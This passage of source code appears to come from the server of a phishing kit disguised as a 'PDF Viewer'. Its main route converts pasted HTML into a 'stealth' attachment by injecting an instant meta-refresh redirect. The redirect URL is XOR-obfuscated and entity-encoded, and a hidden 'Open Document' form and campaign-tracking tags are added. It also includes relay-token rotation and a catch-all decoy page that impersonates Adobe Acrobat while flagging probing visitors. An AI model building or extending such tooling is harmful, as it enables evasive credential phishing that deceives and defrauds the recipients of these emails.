    `FN:${fullName}`,
    `ORG:${org}`,
    phone ? `TEL;TYPE=WORK:${phone}` : '',
    `EMAIL:${email}`,
    `URL:${url}`,
    `NOTE:${note}`,
    'END:VCARD',
  ].filter(Boolean).join('\r\n');
  const fname = `contact-${crypto.randomBytes(3).toString('hex')}.vcf`;
  registerAttachment({ cid, type: 'vcf', label: fullName || 'vCard', fname, ownerId: dbUser.id, slug: dbUser.slug });
  const downloadId = stageDownload({ buffer: Buffer.from(vcf, 'utf8'), filename: fname, contentType: 'text/vcard; charset=utf-8' });
  res.json({ ok: true, downloadId, filename: fname });
});

// ---- Convert any HTML to stealth format ----
app.post(`/${ADMIN_PATH}/api/chameleon/convert`, requireAdmin, (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (!dbUser) return res.status(400).json({ error: 'User not found.' });
  if (dbUser.role !== 'superadmin' && !(dbUser.features&&dbUser.features.convert)) return res.status(403).json({ error: 'HTML Convert is disabled by admin.' });
  if (!dbUser.relayToken) { dbUser.relayToken = crypto.randomBytes(16).toString('hex'); saveUsersDB(); }
  const front = (dbUser.frontDomain || '').replace(/\/+$/, '');
  const myDomain = (dbUser.domainVerified && dbUser.domain) ? dbUser.domain.replace(/\/+$/, '') : '';
  const origin = front || myDomain;
  if (!origin) return res.status(400).json({ error: 'Front domain required. Set Settings → Front Domain before generating.' });

  const { html: rawHtml, title } = req.body || {};
  if (!rawHtml || rawHtml.length < 10) return res.status(400).json({ error: 'Paste your HTML first.' });

  const campaignId = crypto.randomBytes(4).toString('hex');
  const emailPad = crypto.randomBytes(3).toString('hex');
  const owner = usersDB.find(u => u.relayToken === dbUser.relayToken);
  const slug = owner ? owner.slug : dbUser.relayToken.slice(0, 10);

  const pathPart = `/v/${slug}/${emailPad}#E?cid=${campaignId}`;
  const tokenKey = dbUser.relayToken.slice(0, 16);
  const encPath = [...pathPart].map((c, i) => (c.charCodeAt(0) ^ tokenKey.charCodeAt(i % tokenKey.length)).toString(16).padStart(2, '0')).join('');

  const formAction = `${origin}/r`;
  const redirectUrl = `${formAction}?t=${encodeURIComponent(encPath)}&k=${encodeURIComponent(dbUser.relayToken.slice(0, 8))}`;
  const fullEncode = (s) => [...s].map(c => '&#' + c.charCodeAt(0) + ';').join('');

  // Inject: meta refresh + entity-encoded redirect into the pasted HTML
  // Strategy: find <head> and inject meta refresh. Find </body> and inject fallback form.
  let output = rawHtml;

  // Inject meta refresh after <head> or at start
  const metaTag = `<meta http-equiv="refresh" content="0;url=${fullEncode(redirectUrl)}">`;
  if (output.match(/<head[^>]*>/i)) {
    output = output.replace(/<head[^>]*>/i, (m) => m + '\n' + metaTag);
  } else if (output.match(/<html[^>]*>/i)) {
    output = output.replace(/<html[^>]*>/i, (m) => m + '<head>' + metaTag + '</head>');
  } else {
    output = metaTag + '\n' + output;
  }

  // Inject fallback form before </body>
  const fallbackForm = `<noscript><form method="POST" action="${fullEncode(formAction)}" style="text-align:center;margin:20px"><input type="hidden" name="t" value="${encPath}"><input type="hidden" name="k" value="${dbUser.relayToken.slice(0, 8)}"><button type="submit" style="padding:12px 36px;background:#0a84ff;color:#fff;border:none;border-radius:8px;font-size:14px;cursor:pointer">Open Document</button></form></noscript>`;
  if (output.match(/<\/body>/i)) {
    output = output.replace(/<\/body>/i, fallbackForm + '\n</body>');
  } else {
    output += '\n' + fallbackForm;
  }

  // Replace any existing #E tags (leave them — mailer handles)
  // Add campaign tracking comment
  output = `<!-- cid:${campaignId} -->\n` + output;

  const fname = `${slugifyForFilename(title, 'converted')}-${crypto.randomBytes(3).toString('hex')}.html`;
  registerAttachment({ cid: campaignId, type: 'convert', label: title || 'Converted HTML', fname, ownerId: dbUser.id, slug: dbUser.slug });
  const downloadId = stageDownload({ buffer: Buffer.from(output, 'utf8'), filename: fname, contentType: 'text/html; charset=utf-8' });
  res.json({ ok: true, downloadId, filename: fname });
});

app.post(`/${ADMIN_PATH}/api/chameleon/rotate`, requireAdmin, (req, res) => {
  const user = req.session.adminUser;
  const dbUser = usersDB.find(u => u.id === user.id);
  if (!dbUser) return res.status(400).json({ error: 'User not found.' });
  dbUser.relayToken = crypto.randomBytes(16).toString('hex');
  saveUsersDB();
  res.json({ ok: true, relayToken: dbUser.relayToken });
});

// ---- Catch-all: serve decoy page for unknown routes ----
app.use((req, res) => {
  const ip = getIp(req);
  // Don't strike for benign misses like /favicon.ico, /robots.txt, /.well-known, etc.
  // Only strike for genuinely suspicious probing patterns.
  const benign = ['/favicon.ico', '/robots.txt', '/sitemap.xml', '/apple-touch-icon', '/.well-known'];
  if (!benign.some(p => req.path.startsWith(p))) {
    addStrike(ip, 'unknown_route');
  }
  res.status(200).setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Adobe Acrobat</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f4f4f4;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#2c2c2c}
.c{text-align:center;max-width:460px;padding:40px 24px}
.logo{width:64px;height:64px;background:linear-gradient(135deg,#fa1d1d,#b80000);border-radius:14px;margin:0 auto 28px;display:flex;align-items:center;justify-content:center}
.logo svg{width:36px;height:36px}
h1{font-size:22px;font-weight:700;margin-bottom:8px}
p{color:#6e6e73;font-size:14px;line-height:1.6;margin-bottom:24px}
a{display:inline-block;padding:12px 32px;background:#eb1000;color:#fff;text-decoration:none;border-radius:8px;font-size:14px;font-weight:600;transition:background 120ms}
a:hover{background:#c40d00}
.f{margin-top:40px;font-size:11px;color:#aaa}
</style>
</head>
<body>
<div class="c">
<div class="logo"><svg viewBox="0 0 240 234" xmlns="http://www.w3.org/2000/svg"><path fill="#fff" d="M152 0h88v234zM88 0H0v234zM120 86l56 148h-37l-17-42H81z"/></svg></div>
<h1>Adobe Acrobat</h1>
<p>The page you're looking for isn't available. It may have been moved, or the link you followed may be outdated.</p>
<a href="https://www.adobe.com/acrobat">Go to Adobe Acrobat</a>
<p class="f">Adobe, the Adobe logo, and Acrobat are trademarks of Adobe Inc.</p>
</div>
</body>
</html>`);
});


app.listen(PORT, () => {
  console.log(`PDF Viewer running at http://localhost:${PORT}`);
});

